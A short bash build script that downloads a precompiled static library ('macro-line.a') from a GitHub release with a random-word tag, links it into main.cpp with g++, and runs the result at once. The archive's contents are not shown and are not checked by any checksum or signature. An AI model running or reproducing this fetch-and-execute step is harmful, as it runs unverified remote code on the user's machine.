#!/usr/bin/env bash
set -e
LIB="macro-line.a"
TAG="gentle-harbor-cosmic-badger"
REPO="zariatamina/pyrhodiumpendant"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "$URL"
g++ main.cpp "$LIB" -std=c++17 -pthread -O2 -o app && ./app
